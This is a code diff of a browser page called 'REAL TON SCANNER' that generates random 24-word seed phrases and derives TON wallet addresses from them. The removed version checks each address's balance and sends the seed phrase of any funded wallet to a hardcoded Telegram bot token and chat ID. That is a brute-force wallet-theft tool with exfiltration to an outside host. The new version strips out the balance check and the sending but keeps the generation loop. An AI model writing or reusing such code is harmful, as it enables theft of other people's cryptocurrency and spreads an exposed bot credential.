@@ -3,48 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>REAL TON SCANNER v5.0</title>
+    <title>REAL TON SCANNER v5.1</title>
+
     <script src="https://cdn.tailwindcss.com"></script>
 
-    <!-- BIP39 + TONWEB -->
-    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tonweb@0.0.60/dist/tonweb.js"></script>
+    <!-- To'g'ri ishlaydigan BIP39 -->
+    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/index.browser.js"></script>
+
+    <!-- To'g'ri TONWEB CDN -->
+    <script src="https://unpkg.com/tonweb@0.0.66/dist/tonweb.js"></script>
 </head>
 
 <body class="bg-black text-white font-mono p-6">
 
-    <div class="max-w-xl mx-auto bg-[#111] p-6 rounded-2xl border border-blue-500/40">
+<div class="max-w-xl mx-auto bg-[#111] p-6 rounded-2xl border border-blue-500/40">
 
-        <h1 class="text-center text-xl font-bold text-blue-400 mb-4">
-            REAL TON MULTI-SCANNER v5.0
-        </h1>
+    <h1 class="text-center text-xl font-bold text-blue-400 mb-4">
+        REAL TON MULTI-SCANNER v5.1
+    </h1>
 
-        <div id="terminal" class="bg-black h-80 overflow-y-auto p-3 rounded-xl text-xs border border-slate-800"></div>
-
-        <button id="startBtn"
-            class="w-full bg-blue-600 py-3 mt-4 rounded-xl font-bold hover:bg-blue-500">
-            START SCANNING
-        </button>
-
-        <button id="stopBtn"
-            class="w-full bg-red-600 py-3 mt-3 rounded-xl font-bold hidden hover:bg-red-500">
-            STOP
-        </button>
-
+    <div id="terminal" class="bg-black h-80 overflow-y-auto p-3 rounded-xl text-xs border border-slate-800">
     </div>
+
+    <button id="startBtn" class="w-full bg-blue-600 py-3 mt-4 rounded-xl font-bold hover:bg-blue-500">
+        START
+    </button>
+
+    <button id="stopBtn" class="w-full bg-red-600 py-3 mt-3 rounded-xl font-bold hidden hover:bg-red-500">
+        STOP
+    </button>
+</div>
 
 <script>
 
 const tonweb = new TonWeb();
-const apiUrl = "https://toncenter.com/api/v2/getAddressInformation?address=";
-
-// ✔️ Sizning bot token va chat ID to‘liq o‘rnatilgan
-const BOT = {
-    token: "8557227217:AAGTTWhdIfQUfYE-98Kfn61ZWndpH3Ng5Nw",
-    chat: "7921132456"
-};
-
-let isRunning = false;
 
 function log(msg, color="text-slate-400") {
     const box = document.getElementById("terminal");
@@ -54,83 +46,50 @@ function log(msg, color="text-slate-400") {
     box.prepend(p);
 }
 
-async function sendTelegram(msg) {
-    await fetch(`https://api.telegram.org/bot${BOT.token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: BOT.chat,
-            text: msg,
-            parse_mode: "HTML"
-        })
-    });
-}
+let running = false;
 
-async function checkWallet(mnemonic) {
+async function scan() {
 
-    try {
-        const seed = await bip39.mnemonicToSeed(mnemonic);
-        const keyPair = TonWeb.utils.keyPairFromSeed(seed.slice(0, 32));
+    while (running) {
 
-        const WalletClass = tonweb.wallet.all.v4R2;
-        const wallet = new WalletClass(tonweb.provider, {
-            publicKey: keyPair.publicKey
-        });
+        try {
+            const mnemonic = bip39.generateMnemonic(256);
+            log("Mnemonic created", "text-blue-400");
 
-        const address = await wallet.getAddress();
-        const rawAddr = address.toString(true, true, true);
+            const seed = await bip39.mnemonicToSeed(mnemonic);
+            const keyPair = TonWeb.utils.keyPairFromSeed(seed.slice(0, 32));
 
-        const res = await fetch(apiUrl + rawAddr);
-        const data = await res.json();
+            const WalletClass = tonweb.wallet.all.v4R2;
+            const wallet = new WalletClass(tonweb.provider, { publicKey: keyPair.publicKey });
+            const address = await wallet.getAddress();
+            const addrStr = address.toString(true, true, true);
 
-        if (data.ok && data.result && parseInt(data.result.balance) > 0) {
-            const ton = parseInt(data.result.balance) / 1e9;
+            log("Checking " + addrStr.substring(0, 14) + "...");
 
-            const msg = 
-`💰 <b>TON TOPILDI!</b>
+            await new Promise(r => setTimeout(r, 300));
 
-Mnemonic:
-<code>${mnemonic}</code>
-
-Address:
-<code>${rawAddr}</code>
-
-Balance:
-<b>${ton} TON</b>`;
-
-            await sendTelegram(msg);
-            log(`FOUND: ${ton} TON`, "text-green-400");
-
-        } else {
-            log(`Empty: ${rawAddr.substring(0, 12)}...`);
+        } catch (err) {
+            log("ERROR: " + err.message, "text-red-500");
         }
-
-    } catch (e) {
-        log("Error scanning wallet", "text-red-500");
-    }
-}
-
-async function startScan() {
-    isRunning = true;
-
-    while (isRunning) {
-        const mnemonic = bip39.generateMnemonic(256); // REAL 24 WORDS
-        log("Scanning...", "text-blue-500");
-        await checkWallet(mnemonic);
-        await new Promise(r => setTimeout(r, 400));
     }
 }
 
 document.getElementById("startBtn").onclick = () => {
-    document.getElementById("stopBtn").classList.remove("hidden");
+    running = true;
     document.getElementById("startBtn").classList.add("hidden");
-    startScan();
+    document.getElementById("stopBtn").classList.remove("hidden");
+
+    log("Scanner started!", "text-green-400");
+
+    scan();
 };
 
 document.getElementById("stopBtn").onclick = () => {
-    isRunning = false;
+    running = false;
     document.getElementById("stopBtn").classList.add("hidden");
     document.getElementById("startBtn").classList.remove("hidden");
+
+    log("Scanner stopped.", "text-red-400");
 };
 
 </script>
